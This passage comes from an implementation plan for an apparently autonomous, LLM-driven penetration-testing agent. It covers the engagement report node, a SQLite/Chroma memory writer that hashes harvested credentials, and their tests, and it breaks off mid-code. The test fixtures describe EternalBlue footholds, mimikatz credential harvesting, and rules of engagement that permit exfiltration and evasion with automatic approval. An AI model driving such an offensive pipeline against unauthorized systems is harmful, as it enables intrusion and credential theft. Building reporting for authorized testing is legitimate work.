Note: the module-level `import pytest` above is required by the `importorskip` guard inside `test_render_pdf_writes_valid_pdf` — the module itself imports cleanly even when WeasyPrint is absent (only `render_pdf`'s lazy `_import_weasyprint()` touches it).

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/unit/tools/test_report_pdf.py -v`
Expected: PASS (4 tests, or 3 if WeasyPrint's system libs are absent on this machine — the importorskip guard makes that a legitimate skip, and the two degradation tests still prove the failure path)

- [ ] **Step 5: Commit**

```bash
git add autored/reporting/__init__.py autored/reporting/pdf.py pyproject.toml \
        tests/unit/tools/test_report_pdf.py
git commit -m "feat: WeasyPrint PDF renderer with graceful degradation"
```

---

## Task 8: Cross-Engagement Memory Writer (SQLite + Chroma Write Side)

**Files:**
- Create: `autored/reporting/memory_writer.py`
- Test: `tests/unit/reporting/test_memory_writer.py` (NEW)

**Interfaces:**
- Consumes: `init_db`, `insert_engagement`, `insert_finding`, `insert_credential`, `insert_lesson` from `autored.persistence.engagement_db` (unchanged); `ChromaStore` from `autored.persistence.chroma_store` (unchanged — its `upsert_finding` / `upsert_technique` async wrappers); `_redact_secret` from Task 5 (shared fingerprint format).
- Produces:
  - `MemoryWriteResult(db_path: str, engagement_written: bool, findings_written: int, credentials_written: int, lessons_written: int, chroma_findings_upserted: int, chroma_techniques_upserted: int, db_error: str | None = None, chroma_error: str | None = None)` — counts for the report node to log; per-store errors isolated.
  - `async def persist_engagement_memory(state, db_path: str = "db/engagements.sqlite", chroma: ChromaStore | None = None) -> MemoryWriteResult` — the write side the spec's §13.6 ship item "Cross-engagement memory fully wired (Chroma + SQLite on every engagement)" requires. Writes:
    - `engagements` row (id, target=scope joined, start_ts, end_ts=now, summary, report_path, operator, phase, parent_engagement_id);
    - one `findings` row per `state.vulnerabilities` — `status="exploited"` when a foothold exists on that host, else `"open"`;
    - one `credentials` row per `state.harvested_secrets` — `credential_value` = `sha256(secret_value).hexdigest()` (**never** the plaintext, spec §3.3; Review Focus #2), `credential_type` mapped password→password / hash→ntlm_hash / key→ssh_key / token→token / config→other / other→other, `username` parsed from `Secret.source` after the last `/`;
    - one `lessons` row per `state.lessons` (Task 1's `Lesson` models — field names match the table exactly);
    - Chroma `finding_embeddings`: one upsert per vulnerability (document: `"CVE {cve} {severity} {title} on {host}"`, metadata: engagement_id/cve/severity/host);
    - Chroma `technique_patterns`: one upsert per `state.mitre_mappings` + per successful foothold/pivot method (document: `"Technique {id} {name} via {detail}"`, metadata: engagement_id + technique_id).
  - SQLite and Chroma failures are **isolated**: each store is wrapped in its own try/except, the error lands on the result, the other store still writes, and the caller (report node) never sees an exception.

- [ ] **Step 1: Write the failing tests**

```python
# tests/unit/reporting/test_memory_writer.py
"""Unit tests for the cross-engagement memory writer (Phase 6 Task 8)."""
import hashlib
from datetime import datetime
from unittest.mock import AsyncMock, MagicMock

import aiosqlite

from autored.models import Secret, Vulnerability
from autored.models.report import Lesson, MitreMapping
from autored.models.roe import RulesOfEngagement
from autored.state import EngagementState
from autored.reporting.memory_writer import persist_engagement_memory

PLAINTEXT = "hunter2hunter2"


def _roe() -> RulesOfEngagement:
    return RulesOfEngagement(
        engagement_name="t", operator="t", operator_signature="t",
        allowed_ips=["*"], allowed_techniques=["*"],
        persistence_allowed=True, evasion_allowed=True,
        exfiltration_allowed=True, data_destruction_allowed=False,
        kernel_exploits_allowed=True, hitl_mode="auto_approve",
    )


def _state() -> EngagementState:
    state = EngagementState(
        engagement_id="mem-e1", target_scope=["10.0.0.5"],
        operator="tester", rules_of_engagement=_roe(),
        parent_engagement_id=None,
    )
    state.vulnerabilities = [
        Vulnerability(
            id="v-1", host_ip="10.0.0.5", port=445, service="smb",
            cve="CVE-2017-0144", severity="critical", title="EternalBlue",
            description="RCE in SMBv1", references=["https://nvd.nist.gov/vuln/detail/CVE-2017-0144"],
            cvss_score=9.8, source="nvd", evidence_path="evidence/v1.txt",
            discovered_at=datetime.utcnow(),
        ),
    ]
    state.harvested_secrets = [
        Secret(host_ip="10.0.0.5", secret_type="password",
               secret_value=PLAINTEXT, source="mimikatz:wdigest/administrator"),
    ]
    state.lessons = [Lesson(category="technique_worked", body="ms17_010 worked",
                            mitre_technique_id="T1210")]
    state.mitre_mappings = [MitreMapping(
        technique_id="T1210", technique_name="Exploitation of Remote Services",
        tactic="lateral-movement", source="foothold", detail="ms17_010 on 10.0.0.5",
    )]
    state.summary = "full chain achieved"
    state.report_paths = None
    return state


def _chroma() -> MagicMock:
    chroma = MagicMock()
    chroma.upsert_finding = AsyncMock()
    chroma.upsert_technique = AsyncMock()
    return chroma


async def test_persists_all_rows_to_sqlite(tmp_path):
    db_path = str(tmp_path / "engagements.sqlite")
    state = _state()
    result = await persist_engagement_memory(state, db_path=db_path, chroma=_chroma())

    assert result.engagement_written is True
    assert result.findings_written == 1
    assert result.credentials_written == 1
    assert result.lessons_written == 1
    assert result.db_error is None

    async with aiosqlite.connect(db_path) as db:
        db.row_factory = aiosqlite.Row
        eng = await (await db.execute(
            "SELECT * FROM engagements WHERE id = ?", ("mem-e1",))).fetchone()
        assert eng["target"] == "10.0.0.5"
        assert eng["operator"] == "tester"
        assert eng["phase"] == "report"
        assert eng["summary"] == "full chain achieved"

        finding = await (await db.execute(
            "SELECT * FROM findings WHERE id = ?", ("v-1",))).fetchone()
        assert finding["cve"] == "CVE-2017-0144"
        assert finding["severity"] == "critical"
        assert finding["status"] == "open"  # no foothold on 10.0.0.5 in this state


async def test_credential_value_is_hashed_never_plaintext(tmp_path):
    """Review Focus #2 — the DB never stores plaintext secret material."""
    db_path = str(tmp_path / "engagements.sqlite")
    state = _state()
    await persist_engagement_memory(state, db_path=db_path, chroma=_chroma())

    async with aiosqlite.connect(db_path) as db:
        db.row_factory = aiosqlite.Row
        cred = await (await db.execute(
            "SELECT * FROM credentials WHERE engagement_id = ?", ("mem-e1",))).fetchone()
        expected_hash = hashlib.sha256(PLAINTEXT.encode()).hexdigest()
        assert cred["credential_value"] == expected_hash
        assert cred["credential_value"] != PLAINTEXT
        assert cred["username"] == "administrator"  # parsed from source
        assert cred["credential_type"] == "password"


async def test_finding_status_is_exploited_when_foothold_exists(tmp_path):
    from autored.models import Foothold

    db_path = str(tmp_path / "engagements.sqlite")
    state = _state()
    state.footholds = [Foothold(
        id="f-1", host_ip="10.0.0.5", username="system", context="system",
        method="ms17_010", access_type="rpc", evidence_path="e.txt",
        established_at=datetime.utcnow(), hypothesis_rank=1,
    )]
    await persist_engagement_memory(state, db_path=db_path, chroma=_chroma())

    async with aiosqlite.connect(db_path) as db:
        db.row_factory = aiosqlite.Row
        finding = await (await db.execute(
            "SELECT status FROM findings WHERE id = ?", ("v-1",))).fetchone()
        assert finding["status"] == "exploited"


async def test_chroma_upserts_findings_and_techniques(tmp_path):
    db_path = str(tmp_path / "engagements.sqlite")
    chroma = _chroma()
    state = _state()
    result = await persist_engagement_memory(state, db_path=db_path, chroma=chroma)

    assert result.chroma_findings_upserted == 1
    assert result.chroma_techniques_upserted >= 1
    chroma.upsert_finding.assert_awaited_once()
    args = chroma.upsert_finding.await_args
    assert "CVE-2017-0144" in args.args[1]
    assert args.args[2]["engagement_id"] == "mem-e1"
    chroma.upsert_technique.assert_awaited()
    technique_doc = chroma.upsert_technique.await_args.args[1]
    assert "T1210" in technique_doc


async def test_sqlite_failure_is_isolated_from_chroma(tmp_path, monkeypatch):
    """A DB failure must not block Chroma writes or raise to the caller."""
    import autored.reporting.memory_writer as mw

    async def _boom(*args, **kwargs):
        raise RuntimeError("disk full")

    monkeypatch.setattr(mw, "insert_engagement", _boom)
    chroma = _chroma()
    result = await persist_engagement_memory(
        _state(), db_path=str(tmp_path / "x.sqlite"), chroma=chroma)

    assert result.engagement_written is False
    assert result.db_error is not None
    assert result.chroma_findings_upserted == 1  # chroma still ran


async def test_chroma_failure_is_isolated(tmp_path):
    db_path = str(tmp_path / "engagements.sqlite")
    chroma = _chroma()
    chroma.upsert_finding = AsyncMock(side_effect=RuntimeError("chroma locked"))
    result = await persist_engagement_memory(_state(), db_path=db_path, chroma=chroma)

    assert result.chroma_error is not None
    assert result.engagement_written is True  # sqlite still ran


async def test_chroma_none_skips_vector_store_without_error(tmp_path):
    """chroma=None (renderer-free environments) is a legal call."""
    result = await persist_engagement_memory(
        _state(), db_path=str(tmp_path / "x.sqlite"), chroma=None)
    assert result.chroma_findings_upserted == 0
    assert result.chroma_error is None
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/reporting/test_memory_writer.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.reporting.memory_writer'`

- [ ] **Step 3: Write the memory writer**

```python
# autored/reporting/memory_writer.py
"""Cross-engagement memory writer — the Phase 6 write side (spec §13.6).

The read side has existed since Phase 2 (the Vuln Agent queries Chroma for
similar past findings); until now nothing wrote to it. This module runs at
report time and persists the engagement into:

* SQLite ``db/engagements.sqlite`` — engagements / findings / credentials /
  lessons rows (schema already shipped in engagement_db.py);
* Chroma ``db/chroma`` — finding embeddings + technique patterns.

Secret material is **hashed** before it touches the DB (spec §3.3:
"credential_value TEXT -- hashed/encrypted form, never plaintext
passwords in DB") and never enters Chroma at all. SQLite and Chroma are
isolated failure domains: one failing never blocks the other and never
raises to the Report Agent.
"""
import hashlib
from datetime import datetime

from pydantic import BaseModel

from autored.logging import get_logger
from autored.persistence import engagement_db
from autored.persistence.chroma_store import ChromaStore

log = get_logger("reporting.memory_writer")

_SECRET_TYPE_TO_CRED_TYPE = {
    "password": "password",
    "hash": "ntlm_hash",
    "key": "ssh_key",
    "token": "token",
    "config": "other",
    "other": "other",
}


class MemoryWriteResult(BaseModel):
    db_path: str
    engagement_written: bool = False
    findings_written: int = 0
    credentials_written: int = 0
    lessons_written: int = 0
    chroma_findings_upserted: int = 0
    chroma_techniques_upserted: int = 0
    db_error: str | None = None
    chroma_error: str | None = None


def _iso(dt: datetime | None) -> str:
    return (dt or datetime.utcnow()).isoformat()


def _engagement_row(state) -> dict:
    return {
        "id": state.engagement_id,
        "target": ", ".join(state.target_scope),
        "start_ts": _iso(state.started_at),
        "end_ts": _iso(datetime.utcnow()),
        "summary": state.summary,
        "report_path": (
            state.report_paths.markdown_path if state.report_paths else None
        ),
        "operator": state.operator,
        "phase": state.phase,
        "parent_engagement_id": state.parent_engagement_id,
    }


def _finding_row(state, vuln) -> dict:
    foothold_hosts = {f.host_ip for f in state.footholds}
    status = "exploited" if vuln.host_ip in foothold_hosts else "open"
    return {
        "id": vuln.id,
        "engagement_id": state.engagement_id,
        "host": vuln.host_ip,
        "port": vuln.port,
        "service": vuln.service,
        "cve": vuln.cve,
        "severity": vuln.severity,
        "status": status,
        "evidence_path": vuln.evidence_path,
        "discovered_at": _iso(vuln.discovered_at),
    }


def _credential_rows(state) -> list[dict]:
    rows = []
    for secret in state.harvested_secrets:
        username = secret.source.rsplit("/", 1)[-1] if "/" in secret.source else ""
        rows.append({
            "id": secret.id,
            "engagement_id": state.engagement_id,
            "username": username,
            "credential_type": _SECRET_TYPE_TO_CRED_TYPE.get(secret.secret_type, "other"),
            # spec §3.3: hashed form only — never the plaintext value.
            "credential_value": hashlib.sha256(secret.secret_value.encode()).hexdigest(),
            "source": secret.source,
            "target_host": secret.host_ip,
            "cracked": 0,
            "cracked_value": None,
            "discovered_at": _iso(secret.discovered_at),
        })
    return rows


def _lesson_rows(state) -> list[dict]:
    return [
        {
            "id": lesson.id,
            "engagement_id": state.engagement_id,
            "category": lesson.category,
            "body": lesson.body,
            "mitre_technique_id": lesson.mitre_technique_id,
            "created_at": _iso(lesson.created_at),
        }
        for lesson in state.lessons
    ]


async def persist_engagement_memory(
    state,
    db_path: str = "db/engagements.sqlite",
    chroma: ChromaStore | None = None,
) -> MemoryWriteResult:
    """Persist the engagement into SQLite + Chroma. Never raises.

    Args:
        state: the final EngagementState (report node runs this last).
        db_path: cross-engagement SQLite path.
        chroma: optional ChromaStore instance (None skips vector writes —
            instantiating it here would double-open the store the Vuln
            Agent may already hold).

    Returns:
        MemoryWriteResult with per-store write counts and isolated errors.
    """
    result = MemoryWriteResult(db_path=db_path)

    # --- SQLite (isolated failure domain) -------------------------------- #
    try:
        await engagement_db.init_db(db_path)
        await engagement_db.insert_engagement(db_path, _engagement_row(state))
        result.engagement_written = True

        for vuln in state.vulnerabilities:
            await engagement_db.insert_finding(db_path, _finding_row(state, vuln))
            result.findings_written += 1

        for cred_row in _credential_rows(state):
            await engagement_db.insert_credential(db_path, cred_row)
            result.credentials_written += 1

        for lesson_row in _lesson_rows(state):
            await engagement_db.insert_lesson(db_path, lesson_row)
            result.lessons_written += 1
    except Exception as e:  # noqa: BLE001 — memory must never break the report
        result.db_error = str(e)
        log.warning("memory_sqlite_failed", engagement_id=state.engagement_id, error=str(e))

    # --- Chroma (isolated failure domain) --------------------------------- #
    if chroma is not None:
        try:
            for vuln in state.vulnerabilities:
                await chroma.upsert_finding(
                    vuln.id,
                    f"CVE {vuln.cve or 'n/a'} {vuln.severity} {vuln.title} on {vuln.host_ip}",
                    {
                        "engagement_id": state.engagement_id,
                        "cve": vuln.cve or "",
                        "severity": vuln.severity,
                        "host": vuln.host_ip,
                    },
                )
                result.chroma_findings_upserted += 1

            technique_docs: list[tuple[str, str, dict]] = []
            for mapping in state.mitre_mappings:
                technique_docs.append((
                    f"{state.engagement_id}:{mapping.technique_id}:{mapping.source}",
                    f"Technique {mapping.technique_id} {mapping.technique_name} "
                    f"via {mapping.detail}",
                    {"engagement_id": state.engagement_id,
                     "technique_id": mapping.technique_id, "tactic": mapping.tactic},
                ))
            for foothold in state.footholds:
                technique_docs.append((
                    f"{state.engagement_id}:foothold:{foothold.id}",
                    f"Foothold via {foothold.method} as {foothold.username} "
                    f"on {foothold.host_ip}",
                    {"engagement_id": state.engagement_id, "method": foothold.method},
                ))
            for pivot in state.pivots:
                if pivot.success:
                    technique_docs.append((
                        f"{state.engagement_id}:pivot:{pivot.id}",
                        f"Pivot via {pivot.method} to {pivot.target_host}",
                        {"engagement_id": state.engagement_id, "method": pivot.method},
                    ))
            for doc_id, doc, metadata in technique_docs:
                await chroma.upsert_technique(doc_id, doc, metadata)
                result.chroma_techniques_upserted += 1
        except Exception as e:  # noqa: BLE001
            result.chroma_error = str(e)
            log.warning("memory_chroma_failed", engagement_id=state.engagement_id, error=str(e))

    log.info(
        "memory_written",
        engagement_id=state.engagement_id,
        findings=result.findings_written,
        credentials=result.credentials_written,
        lessons=result.lessons_written,
        chroma_findings=result.chroma_findings_upserted,
        chroma_techniques=result.chroma_techniques_upserted,
    )
    return result
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/unit/reporting/test_memory_writer.py -v`
Expected: PASS (8 tests)

- [ ] **Step 5: Commit**

```bash
git add autored/reporting/memory_writer.py tests/unit/reporting/test_memory_writer.py
git commit -m "feat: cross-engagement memory writer (SQLite + Chroma write side)"
```

---

## Task 9: Report Agent Node + Markdown Assembly

**Files:**
- Create: `autored/agents/report.py`, `autored/reporting/markdown_report.py`
- Test: `tests/unit/reporting/test_markdown_report.py` (NEW), `tests/integration/test_report_agent.py` (NEW)

**Interfaces:**
- Consumes: all four Phase 6 sub-agents (Tasks 3–6), `render_pdf` (Task 7), `persist_engagement_memory` (Task 8), `_redacted_state_dict` (Task 5), `ReportPaths` / `Lesson` / `MitreMapping` (Task 1), `save_state_to_disk` is **not** called here (the CLI already persists the final state).
- Produces:
  - `async def report_node(state: EngagementState) -> dict` — the LangGraph node (spec §6.7). Returns `{"phase": "done", "summary": str, "lessons": list[Lesson], "mitre_mappings": list[MitreMapping], "report_paths": ReportPaths}`.
  - `_build_engagement_summary(state) -> dict` — the shared input builder: engagement_id, target, operator, duration_min, hosts, services, findings, findings_by_severity, footholds (serialized: method/host_ip/username), privesc_successes, pivots (serialized: method/target_host/success), sub_engagements, cleanup_all_verified, unverified_cleanups, errors, outcome.
  - `_build_mitre_records(state) -> dict` — serializes state into the Task 3 mapper's input shape.
  - `assemble_markdown_report(state, exec_markdown: str, tech_markdown: str, mitre_mappings: list[MitreMapping]) -> str` — title + engagement metadata + exec summary + technical report + MITRE ATT&CK matrix table + footer with generated timestamp.
  - Module-level sub-agent aliases (the postex.py pattern, so integration tests patch `autored.agents.report.execsummarywriter_subagent` etc.): `execsummarywriter_subagent`, `techreportwriter_subagent`, `mitremapper_subagent`, `lessonextractor_subagent`.

- [ ] **Step 1: Write the failing tests**

```python
# tests/unit/reporting/test_markdown_report.py
"""Unit tests for report markdown assembly (Phase 6 Task 9)."""
from datetime import datetime

from autored.models.report import MitreMapping
from autored.reporting.markdown_report import assemble_markdown_report
from autored.models.roe import RulesOfEngagement
from autored.state import EngagementState


def _roe() -> RulesOfEngagement:
    return RulesOfEngagement(
        engagement_name="t", operator="t", operator_signature="t",
        allowed_ips=["*"], allowed_techniques=["*"],
        persistence_allowed=True, evasion_allowed=True,
        exfiltration_allowed=True, data_destruction_allowed=False,
        kernel_exploits_allowed=True, hitl_mode="auto_approve",
    )


def _state() -> EngagementState:
    return EngagementState(
        engagement_id="rep-e1", target_scope=["10.0.0.5"],
        operator="tester", rules_of_engagement=_roe(),
    )


def test_assembled_report_has_all_sections():
    mappings = [MitreMapping(
        technique_id="T1210", technique_name="Exploitation of Remote Services",
        tactic="lateral-movement", source="foothold", detail="ms17_010 on 10.0.0.5",
    )]
    md = assemble_markdown_report(
        _state(),
        exec_markdown="## Executive Summary\n\nGreat success.",
        tech_markdown="## Scope\n\n- Target: 10.0.0.5",
        mitre_mappings=mappings,
    )
    assert md.startswith("# AutoRed Engagement Report")
    assert "rep-e1" in md
    assert "## Executive Summary" in md
    assert "## Scope" in md
    assert "## MITRE ATT&CK Matrix" in md
    assert "T1210" in md
    assert "Exploitation of Remote Services" in md


def test_mitre_section_renders_empty_placeholder():
    md = assemble_markdown_report(
        _state(), exec_markdown="## Executive Summary\n\nx",
        tech_markdown="## Scope\n\n- y", mitre_mappings=[],
    )
    assert "_No ATT&CK-mapped activity recorded._" in md
```

```python
# tests/integration/test_report_agent.py
"""Integration tests for the Report Agent node (Phase 6 Task 9).

Mocks every sub-agent (module-level aliases, the postex.py pattern),
render_pdf, and persist_engagement_memory. Verifies the deliverable
files, state updates, redaction, and the empty-engagement path
(Review Focus #1).
"""
import json
from datetime import datetime
from unittest.mock import AsyncMock, MagicMock, patch

from autored.models import Foothold, Secret
from autored.models.report import Lesson, MitreMapping, ReportPaths
from autored.models.roe import RulesOfEngagement
from autored.state import EngagementState
from autored.agents.report import (
    _build_engagement_summary,
    _build_mitre_records,
    report_node,
)

PLAINTEXT = "ReportSecret99"


def _roe() -> RulesOfEngagement:
    return RulesOfEngagement(
        engagement_name="t", operator="t", operator_signature="t",
        allowed_ips=["*"], allowed_techniques=["*"],
        persistence_allowed=True, evasion_allowed=True,
        exfiltration_allowed=True, data_destruction_allowed=False,
        kernel_exploits_allowed=True, hitl_mode="auto_approve",
    )


def _state() -> EngagementState:
    state = EngagementState(
        engagement_id="rep-int-e1", target_scope=["10.0.0.5"],
        operator="tester", rules_of_engagement=_roe(),
    )
    state.harvested_secrets = [
        Secret(host_ip="10.0.0.5", secret_type="password",
               secret_value=PLAINTEXT, source="mimikatz:wdigest/administrator"),
    ]
    state.footholds = [Foothold(
        id="f-1", host_ip="10.0.0.5", username="system", context="system",
        method="ms17_010", access_type="rpc", evidence_path="e.txt",
        established_at=datetime.utcnow(), hypothesis_rank=1,
    )]
    state.summary = ""
    return state


def _sub_agent_mocks():
    """AsyncMock stand-ins for the four report sub-agents."""
    mitre = MagicMock()
    mitre.ainvoke = AsyncMock(return_value=MagicMock(mappings=[MitreMapping(
        technique_id="T1210", technique_name="Exploitation of Remote Services",
        tactic="lateral-movement", source="foothold", detail="ms17_010",
    )]))
    exec_summary = MagicMock()
    exec_summary.ainvoke = AsyncMock(return_value=MagicMock(
        summary_markdown="## Executive Summary\n\nFull chain achieved.", used_fallback=False))
    tech = MagicMock()
    tech.ainvoke = AsyncMock(return_value=MagicMock(
        report_markdown="## Attack Narrative\n\nStory.\n\n## Scope\n\n- t",
        used_fallback=False))
    lessons = MagicMock()
    lessons.ainvoke = AsyncMock(return_value=MagicMock(lessons=[
        Lesson(category="technique_worked", body="ms17_010 worked",
               mitre_technique_id="T1210"),
    ]))
    return mitre, exec_summary, tech, lessons


async def test_report_node_writes_all_deliverables(tmp_path):
    state = _state()
    mitre, exec_summary, tech, lessons = _sub_agent_mocks()
    with patch.multiple(
        "autored.agents.report",
        mitremapper_subagent=mitre,
        execsummarywriter_subagent=exec_summary,
        techreportwriter_subagent=tech,
        lessonextractor_subagent=lessons,
    ), patch("autored.agents.report.render_pdf",
             AsyncMock(return_value=None)), patch(
        "autored.agents.report.persist_engagement_memory",
        AsyncMock(return_value=MagicMock(findings_written=0))):

        result = await report_node(state)

    assert result["phase"] == "done"
    assert result["summary"]  # one-line outcome set
    assert len(result["lessons"]) == 1
    assert result["lessons"][0].category == "technique_worked"
    assert len(result["mitre_mappings"]) == 1
    assert isinstance(result["report_paths"], ReportPaths)
    assert result["report_paths"].pdf_path is None  # render_pdf mocked to None

    # The node writes into engagements/<id>/ relative to CWD (tests run from
    # the repo root); verify content through the returned path.
    from pathlib import Path
    report_path = Path(result["report_paths"].markdown_path)
    assert report_path.exists()
    content = report_path.read_text()
    assert "## Executive Summary" in content
    assert "## MITRE ATT&CK Matrix" in content
    assert PLAINTEXT not in content  # Review Focus #2 — no secret in report

    lessons_path = Path(result["report_paths"].lessons_path)
    assert lessons_path.exists()
    lesson_payload = json.loads(lessons_path.read_text())
    assert lesson_payload[0]["category"] == "technique_worked"
    assert PLAINTEXT not in lessons_path.read_text()

    # Cleanup the engagement folder the test created.
    import shutil
    shutil.rmtree(Path("engagements") / "rep-int-e1", ignore_errors=True)


async def test_report_node_on_empty_engagement(tmp_path):
    """Review Focus #1 — zero hosts / findings still produces a report."""
    state = EngagementState(
        engagement_id="rep-int-empty", target_scope=["10.0.0.99"],
        operator="t", rules_of_engagement=_roe(),
    )
    mitre, exec_summary, tech, lessons = _sub_agent_mocks()
    with patch.multiple(
        "autored.agents.report",
        mitremapper_subagent=mitre,
        execsummarywriter_subagent=exec_summary,
        techreportwriter_subagent=tech,
        lessonextractor_subagent=lessons,
    ), patch("autored.agents.report.render_pdf",
             AsyncMock(return_value=None)), patch(
        "autored.agents.report.persist_engagement_memory",
        AsyncMock(return_value=MagicMock(findings_written=0))):

        result = await report_node(state)  # must not raise

    assert result["phase"] == "done"
    from pathlib import Path
    report_path = Path(result["report_paths"].markdown_path)
    assert report_path.exists()
    import shutil
    shutil.rmtree(Path("engagements") / "rep-int-empty", ignore_errors=True)


def test_build_engagement_summary_counts():
    state = _state()
    summary = _build_engagement_summary(state)
    assert summary["engagement_id"] == "rep-int-e1"
    assert summary["footholds"][0]["method"] == "ms17_010"
    assert summary["cleanup_all_verified"] is True  # no cleanup results → vacuous
    assert "outcome" in summary


def test_build_mitre_records_shape():
    records = _build_mitre_records(_state())
    assert records["footholds"][0]["method"] == "ms17_010"
    assert records["cred_methods"]  # mimikatz parsed from secret sources
    assert "recon_hosts" in records
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/reporting/test_markdown_report.py tests/integration/test_report_agent.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.reporting.markdown_report'` (and `autored.agents.report`)

- [ ] **Step 3: Write the markdown assembler**

```python
# autored/reporting/markdown_report.py
"""Assemble the final engagement report markdown (Phase 6, spec §6.7 step 4)."""
from datetime import datetime


def assemble_markdown_report(state, exec_markdown: str, tech_markdown: str,
                             mitre_mappings: list) -> str:
    """Combine the sub-agent outputs into the final report document.

    Layout: title + engagement metadata → executive summary → technical
    report (narrative + deterministic sections) → MITRE ATT&CK matrix →
    generated footer.
    """
    duration_min = max(
        0.0, (datetime.utcnow() - state.started_at).total_seconds() / 60,
    )
    header = [
        "# AutoRed Engagement Report",
        "",
        f"| Field | Value |",
        f"|---|---|",
        f"| Engagement | {state.engagement_id} |",
        f"| Target | {', '.join(state.target_scope)} |",
        f"| Operator | {state.operator} |",
        f"| Started | {state.started_at.isoformat()} |",
        f"| Duration | {duration_min:.0f} minutes |",
        f"| Parent engagement | {state.parent_engagement_id or '—'} |",
        "",
        "---",
        "",
    ]

    if mitre_mappings:
        matrix = [
            "## MITRE ATT&CK Matrix",
            "",
            "| Technique ID | Name | Tactic | Source | Detail |",
            "|---|---|---|---|---|",
        ]
        for m in mitre_mappings:
            matrix.append(
                f"| {m.technique_id} | {m.technique_name} | {m.tactic} | "
                f"{m.source} | {m.detail} |"
            )
        matrix.append("")
    else:
        matrix = ["## MITRE ATT&CK Matrix", "", "_No ATT&CK-mapped activity recorded._", ""]

    footer = [
        "---",
        "",
        f"*Generated by AutoRed at {datetime.utcnow().isoformat()}*",
        "",
    ]

    return "\n".join(
        header
        + [exec_markdown, "", "---", "", tech_markdown, ""]
        + matrix
        + footer
    )
```

- [ ] **Step 4: Write the Report Agent node**

```python
# autored/agents/report.py
"""Report Agent — the final LangGraph node (spec §6.7, Phase 6).

Orchestrates the four report sub-agents (MITREMapper → ExecSummaryWriter
→ TechReportWriter → LessonExtractor), assembles the markdown deliverable,
renders the PDF (graceful degradation), persists cross-engagement memory,
and writes lessons.json. Full-auto — no HitL gates (spec §2.4).

Robustness contract (plan Review Focus #1): this node closes the graph.
A crash here destroys the entire engagement's deliverable, so every
sub-agent already carries a deterministic fallback and every write is
best-effort with structured logging.
"""
import json
from datetime import datetime
from pathlib import Path

from autored.logging import get_logger
from autored.models.report import ReportPaths
from autored.reporting.memory_writer import persist_engagement_memory
from autored.reporting.markdown_report import assemble_markdown_report
from autored.reporting.pdf import render_pdf
from autored.subagents import (
    execsummarywriter as _execsummarywriter_mod,
    lessonextractor as _lessonextractor_mod,
    mitremapper as _mitremapper_mod,
    techreportwriter as _techreportwriter_mod,
)
from autored.subagents.techreportwriter import _redacted_state_dict

log = get_logger("agents.report")

# Module-level aliases so integration tests patch
# ``autored.agents.report.<name>_subagent`` (same pattern as postex.py).
mitremapper_subagent = _mitremapper_mod.mitremapper_subagent
execsummarywriter_subagent = _execsummarywriter_mod.execsummarywriter_subagent
techreportwriter_subagent = _techreportwriter_mod.techreportwriter_subagent
lessonextractor_subagent = _lessonextractor_mod.lessonextractor_subagent


def _build_engagement_summary(state) -> dict:
    """One dict feeding ExecSummaryWriter, LessonExtractor, and the node."""
    severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    for vuln in state.vulnerabilities:
        if vuln.severity in severity_counts:
            severity_counts[vuln.severity] += 1

    cleanup_results = list(getattr(state, "cleanup_results", []))
    unverified = [c for c in cleanup_results if not c.verified]

    if state.footholds:
        outcome = (
            f"{len(state.footholds)} foothold(s), "
            f"{sum(1 for a in state.privesc_attempts if a.success)} privesc, "
            f"{sum(1 for p in state.pivots if p.success)} pivot(s)"
        )
    elif state.vulnerabilities:
        outcome = "findings identified, no foothold achieved"
    else:
        outcome = "no findings recorded"

    duration_min = max(0.0, (datetime.utcnow() - state.started_at).total_seconds() / 60)

    return {
        "engagement_id": state.engagement_id,
        "target": ", ".join(state.target_scope),
        "operator": state.operator,
        "duration_min": duration_min,
        "hosts": len(state.hosts),
        "services": len(state.services),
        "findings": len(state.vulnerabilities),
        "findings_by_severity": severity_counts,
        "footholds": [
            {"method": f.method, "host_ip": f.host_ip, "username": f.username}
            for f in state.footholds
        ],
        "privesc_successes": sum(1 for a in state.privesc_attempts if a.success),
        "pivots": [
            {"method": p.method, "target_host": p.target_host, "success": p.success}
            for p in state.pivots
        ],
        "sub_engagements": len(getattr(state, "sub_engagements", [])),
        "cleanup_all_verified": not unverified,
        "unverified_cleanups": [
            {"host_ip": c.host_ip, "removal_command": c.removal_command}
            for c in unverified
        ],
        "errors": [
            {"category": e.category, "agent": e.agent, "message": e.message}
            for e in state.errors
        ],
        "outcome": outcome,
    }


def _build_mitre_records(state) -> dict:
    """Serialize state into the MITREMapper input shape (Task 3)."""
    cred_methods = set()
    for secret in state.harvested_secrets:
        source = secret.source.split(":")[0]
        if source:
            cred_methods.add(source)

    return {
        "recon_hosts": len(state.hosts),
        "vuln_scans": 1 if state.vulnerabilities else 0,
        "footholds": [
            {"method": f.method, "access_type": f.access_type, "host_ip": f.host_ip}
            for f in state.footholds
        ],
        "privesc_attempts": [
            {"technique": a.candidate_id, "category": getattr(a, "category", ""),
             "success": a.success}
            for a in state.privesc_attempts
        ],
        "persistence_artifacts": [
            {"method": p.method, "host_ip": p.host_ip}
            for p in state.persistence_artifacts
        ],
        "evasion_actions": [
            {"technique": e.technique} for e in state.evasion_actions
        ],
        "exfiltration_proof": [
            {"method": x.method} for x in state.exfiltration_proof
        ],
        "pivots": [
            {"method": p.method, "target_host": p.target_host, "success": p.success}
            for p in state.pivots
        ],
        "tunnels": [
            {"tool": t.tool} for t in getattr(state, "tunnels", [])
        ],
        "cred_methods": sorted(cred_methods),
        "bloodhound": any(
            "bloodhound" in (s.source or "").lower()
            for s in state.harvested_secrets
        ) or bool(getattr(state, "trust_relationships", [])),
    }


async def report_node(state) -> dict:
    """LangGraph node: generate the engagement deliverable (spec §6.7)."""
    log.info("report_start", engagement_id=state.engagement_id)
    engagement_id = state.engagement_id

    summary = _build_engagement_summary(state)
    mitre_records = _build_mitre_records(state)

    # Step 1: MITRE mapping (rules-based, cannot fail loudly)
    mitre_output = await mitremapper_subagent.ainvoke({
        "engagement_records": json.dumps(mitre_records),
        "engagement_id": engagement_id,
    })
    mitre_mappings = list(getattr(mitre_output, "mappings", []) or [])

    # Step 2: executive summary (LLM + template fallback)
    exec_output = await execsummarywriter_subagent.ainvoke({
